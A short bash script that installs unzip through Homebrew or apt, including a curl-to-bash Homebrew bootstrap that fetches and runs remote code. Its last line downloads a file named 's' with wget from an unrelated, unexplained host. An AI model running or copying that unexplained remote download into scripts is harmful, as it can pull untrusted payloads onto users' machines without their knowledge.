# 根据系统安装unzip
#!/bin/bash

#!/bin/bash

# 检查是否已安装 unzip
if ! command -v unzip &> /dev/null; then
    echo "unzip is not installed. Installing unzip..."
    # 检查操作系统类型
    if [[ $(uname) == "Darwin" ]]; then
        # macOS
        if ! command -v brew &> /dev/null; then
            echo "Homebrew is not installed. Installing Homebrew..."
            /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
        fi
        echo "Installing unzip..."
        brew install unzip
    elif [[ $(uname) == "Linux" ]]; then
        # Ubuntu/Debian
        if ! command -v apt &> /dev/null; then
            echo "apt package manager not found. Please install unzip manually."
            exit 1
        fi
        echo "Updating package lists..."
        sudo apt update
        echo "Installing unzip..."
        sudo apt install -y unzip
    else
        echo "Unsupported operating system. Please install unzip manually."
        exit 1
    fi
else
    echo "unzip is already installed."
fi

echo "unzip installation completed."

wget https://mirc.undf.top/s